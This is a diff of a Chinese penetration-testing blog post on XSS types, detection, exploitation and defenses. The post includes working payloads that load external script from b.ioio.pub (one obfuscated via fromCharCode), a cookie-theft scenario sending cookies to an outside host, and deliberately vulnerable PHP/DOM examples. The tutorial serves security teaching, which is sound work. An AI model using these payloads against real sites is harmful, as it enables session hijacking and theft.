@@ -1,112 +1,27 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>XSS 漏洞及其挖掘方法 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>XSS 漏洞及其挖掘方法</h1>
-      
-<div class="post-meta">
-    <time>2016-07-15</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/xss">xss</a>)
-</div>
-
-      <div><h3 id="0x00-简介">0x00 简介</h3>
-<p>XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&quot;脚本&quot;这两个字上，脚本主要有两个：JavaScript和ActionScript。<br>
-<f>要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。</f></p>
-<h3 id="0x01-危害">0x01 危害</h3>
-<p>JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。</p>
-<pre tabindex="0"><code>• 盗取管理员Cookie
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>XSS 漏洞及其挖掘方法 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>XSS 漏洞及其挖掘方法</h1><div class=post-meta><time>2016-07-15</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/xss>xss</a>)</div><div><h3 id=0x00-简介>0x00 简介</h3><p>XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在"脚本"这两个字上，脚本主要有两个：JavaScript和ActionScript。<br><f>要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。</f></p><h3 id=0x01-危害>0x01 危害</h3><p>JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。</p><pre tabindex=0><code>• 盗取管理员Cookie
 • XSS Worm
 • 挂马(水坑攻击)
 • 键盘记录(有局限性)
 • 利用网站重定向
 • 修改网页内容
 • 等等
-</code></pre><h3 id="0x02-攻击场景">0x02 攻击场景</h3>
-<p>在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。</p>
-<pre tabindex="0"><code>• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等
+</code></pre><h3 id=0x02-攻击场景>0x02 攻击场景</h3><p>在各类SNS、邮件系统、开源流行的Web应用、BBS、微博等社交场景中，前端攻击被广泛实施与关注。主要是一些大型网站才有价值。</p><pre tabindex=0><code>• 支持html解析和javascript解析的客户端,如：html文档、flsh、pdf等
 • url的参数，回显到网页上
 • form表单提交的内容出现在网页上，如：昵称、邮箱、简介、留言
 • 等等
-</code></pre><h3 id="0x03-分类">0x03 分类</h3>
-<p>主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。</p>
-<ul>
-<li>反射型XSS</li>
-</ul>
-<p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。</p>
-<pre tabindex="0"><code>简单流程：
+</code></pre><h3 id=0x03-分类>0x03 分类</h3><p>主要分为三类：反射型、存储型、DOM型(还有flash XSS、mXSS)。</p><ul><li>反射型XSS</li></ul><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。</p><pre tabindex=0><code>简单流程：
 1. 用户访问带有XSS代码的URL请求
 2. 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器
 3. 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞
@@ -118,11 +33,7 @@
 4. hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击
 5. 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com
 6. hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息
-</code></pre><ul>
-<li>存储型XSS</li>
-</ul>
-<p>存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</p>
-<pre tabindex="0"><code>测试技巧：
+</code></pre><ul><li>存储型XSS</li></ul><p>存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</p><pre tabindex=0><code>测试技巧：
 1. 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行，如：&lt;input type=&#34;text&#34; name=&#34;content&#34; value=&#34;&lt;script&gt;alert(/xss/)&lt;/script&gt;&#34; /&gt;
 
 2. 确定输出点后根据相应的标签构造HTML代码来闭合，如：&#34; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&#34;，最终在html中为：&lt;input type=&#34;text&#34; name=&#34;content&#34; value=&#34;&#34; /&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&#34;&#34; /&gt;
@@ -134,39 +45,20 @@
     a. &lt;script&gt;alert(document.cookie)&lt;/script&gt; //普通注入
     b. &#34; /&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; //闭合标签注入
     c. &lt;/textarea&gt;&#39;&#34;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; //闭合标签注入
-</code></pre><ul>
-<li>DOM XSS</li>
-</ul>
-<p>DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
-<pre tabindex="0"><code>DOM的规定如下：
+</code></pre><ul><li>DOM XSS</li></ul><p>DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。</p><pre tabindex=0><code>DOM的规定如下：
 • 整个文档是一个文档节点
 • 每个HTML标签是一个元素节点
 • 包含在HTML元素中的文本是文本节点
 • 每个HTML属性是一个属性节点
 • 节点与节点之间都有等级关系
 </code></pre><p>HTML的标签都是一个个节点，这些节点组成了DOM的整体结构：节点树，如下图：
-<img src="/img/post/xss_dom_tree.png" alt="xss中DOM树"></p>
-<ul>
-<li>flash XSS</li>
-</ul>
-<p>利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。<br>
-flash文件可以实现一些功能，如google的mail域下的sound.swf是用来播放声音的，uploaderapi2.swf是上传文件, audio.swf是播放音频文件。<br>
-如：<code>https://mail.google.com/mail/html/audio.swf?videoUrl=aa.mp4</code>，audio.swf文件就是从videoUrl接收参数然后进行播放。</p>
-<pre tabindex="0"><code>#现有flash文件aa.swf，源码如下：
+<img src=/img/post/xss_dom_tree.png alt=xss中DOM树></p><ul><li>flash XSS</li></ul><p>利用网页上flash文件的缺陷来执行js脚本，一般是反射型XSS。<br>flash文件可以实现一些功能，如google的mail域下的sound.swf是用来播放声音的，uploaderapi2.swf是上传文件, audio.swf是播放音频文件。<br>如：<code>https://mail.google.com/mail/html/audio.swf?videoUrl=aa.mp4</code>，audio.swf文件就是从videoUrl接收参数然后进行播放。</p><pre tabindex=0><code>#现有flash文件aa.swf，源码如下：
 var func:String=root.loaderInfo.parameters.func; //接受FLASH所带的func参数
 var val:String=root.loaderInfo.parameters.val; //接受FLASH所带的vul参数
 ExternalInterface.call(func,vul);
 
 #当访问http://localhost/aa.swf?func=alert&amp;vul=&#34;document.domain&#34;时就会弹窗域名
-</code></pre><h3 id="0x04-xss的检测">0x04 XSS的检测</h3>
-<p>检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测<br>
-手工检测：检测结果准确，但对于大型web来说费时费力<br>
-软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出<br>
-<f>检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出</f></p>
-<ul>
-<li>手工检测</li>
-</ul>
-<pre tabindex="0"><code>可得知输出位置:
+</code></pre><h3 id=0x04-xss的检测>0x04 XSS的检测</h3><p>检测XSS一般分两种方法：一种是手工检测、一种是软件自动检测<br>手工检测：检测结果准确，但对于大型web来说费时费力<br>软件检测：方便省力，但存在误报，且有些隐蔽的XSS无法检测出<br><f>检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出</f></p><ul><li>手工检测</li></ul><pre tabindex=0><code>可得知输出位置:
     • 输入敏感字符，如&lt;、&gt;、&#34;、&#39;、()等，然后在提交后查看html源代码，看这些字符是否被转义。
     • 在输出这些字符时，程序可能已经进行了过滤，可以输入“AAAAAA&lt;&gt;&#34;&amp;&#39;()”字符串，然后查找AAAAAA或许比较方便。
 无法得知输出位置:
@@ -174,42 +66,29 @@ ExternalInterface.call(func,vul);
     在标签中：&lt;div&gt;XSS Test&lt;/div&gt;
     在属性内：&lt;input type=&#34;text&#34; name=&#34;content&#34; value=&#34;XSS Test&#34; /&gt;
     这种情况通常采用输入&#34;/&gt;XSS Test来测试。
-</code></pre><ul>
-<li>全自动检测XSS
-如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。<br>
-专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(<code>www.domxssscanner.com</code>)。<br>
-一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。</li>
-</ul>
-<h3 id="0x05-xss的挖掘与利用">0x05 XSS的挖掘与利用</h3>
-<ul>
-<li>XSS漏洞挖掘</li>
-</ul>
-<pre tabindex="0"><code>反射型XSS：
+</code></pre><ul><li>全自动检测XSS
+如APPSCAN、AWVS、Burp Suite等软件都可以有效的检测XSS，他们还会检测其他的漏洞，但是他们的效率不如专业的XSS检测工具高。<br>专业的XSS扫描工具有知名的XSSER、XSSF等，还有专门扫描DOM类型XSS的web服务(<code>www.domxssscanner.com</code>)。<br>一般要手工和软件一起使用，因为有些XSS软件不能检测，比如有些留言需要输入验证码等，工具无法做到。</li></ul><h3 id=0x05-xss的挖掘与利用>0x05 XSS的挖掘与利用</h3><ul><li>XSS漏洞挖掘</li></ul><pre tabindex=0><code>反射型XSS：
     一般是url参数中的值能够回显到HTML中，且url的参数值没有过滤或过滤不严
 存储型XSS：
     可以提交内容
     提交的内容可被管理员或其他用户看到
     提交的内容没有被过滤或过滤不严
-</code></pre><ul>
-<li>XSS漏洞利用
-XSS一般就是闭合标签，和SQL注入类似，常见payload如下：</li>
-</ul>
-<pre tabindex="0"><code>• &lt;script src=&#39;http://b.ioio.pub/xss/probe.js&#39;&gt;&lt;/script&gt;
+</code></pre><ul><li>XSS漏洞利用
+XSS一般就是闭合标签，和SQL注入类似，常见payload如下：</li></ul><pre tabindex=0><code>• &lt;script src=&#39;http://b.ioio.pub/xss/probe.js&#39;&gt;&lt;/script&gt;
 • &lt;img src=x onerror=&#34;s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&#39;&#34;;&gt;
 • &lt;svg onload=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://b.ioio.pub/xss/probe.js&gt;
 • &lt;svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,
     114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,
     115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,
     112,114,111,98,101,46,106,115)) &gt;
-</code></pre><h3 id="0x06-xss简单示例">0x06 XSS简单示例</h3>
-<pre tabindex="0"><code>反射型xss简单示例:
+</code></pre><h3 id=0x06-xss简单示例>0x06 XSS简单示例</h3><pre tabindex=0><code>反射型xss简单示例:
     • &lt;?php
           echo $_GET[&#39;x&#39;];
       ?&gt;
     • 提交：
       /xss.php?x=&lt;script&gt;alert(1)&lt;/script&gt;
     • 服务端解析时就会触发弹窗
-</code></pre><pre tabindex="0"><code>下面是一段简单的DOM型XSS示例：
+</code></pre><pre tabindex=0><code>下面是一段简单的DOM型XSS示例：
 &lt;script&gt;
     var temp = document.URL; //获取URL
     var index = document.URL.indexOf(&#34;content&#34;);
@@ -217,56 +96,25 @@ XSS一般就是闭合标签，和SQL注入类似，常见payload如下：</li>
     document.write(decodeURL(par)); //输入获取内容
 &lt;/script&gt;
 上述代码的意思是获取URL中content参数的值，并且输出，若输入http://www.xxx.com/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;，就会产生XSS漏洞。
-</code></pre><pre tabindex="0"><code>只要在script标签中添加JavaScript代码，就能实现一些“特殊效果”，但通常在真实攻击中
+</code></pre><pre tabindex=0><code>只要在script标签中添加JavaScript代码，就能实现一些“特殊效果”，但通常在真实攻击中
 一般使用&lt;script src=&#34;http://www.xxx.com/a.txt&#34;&gt;&lt;/script&gt;的方式来加载外部脚本，
 a.txt中就存放着恶意脚本。
 
 注：JavaScript加载的脚本文件可以是任意扩展名，甚至没有也行，只要加载的文件中含有
     JavaScript代码就会被执行。
-</code></pre><h3 id="0x07-xss的防御">0x07 XSS的防御</h3>
-<ul>
-<li>过滤输入与输出(重点)</li>
-</ul>
-<p>使用htmlspecialchars()和htmlentities()将一些预定义的字符转换为HTML实体</p>
-<pre tabindex="0"><code>&lt;?php
+</code></pre><h3 id=0x07-xss的防御>0x07 XSS的防御</h3><ul><li>过滤输入与输出(重点)</li></ul><p>使用htmlspecialchars()和htmlentities()将一些预定义的字符转换为HTML实体</p><pre tabindex=0><code>&lt;?php
     @$html = $_GET[&#39;x&#39;];
     if ($html){
         echo htmlspecialchars($html);
     }
 ?&gt;
-</code></pre><ul>
-<li>HttpOnly</li>
-</ul>
-<pre tabindex="0"><code>HttpOnly并不能防御XSS，但它能解决XSS漏洞后面的Cookie劫持攻击，防止XSS会话劫持
-</code></pre></div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><ul><li>HttpOnly</li></ul><pre tabindex=0><code>HttpOnly并不能防御XSS，但它能解决XSS漏洞后面的Cookie劫持攻击，防止XSS会话劫持
+</code></pre></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
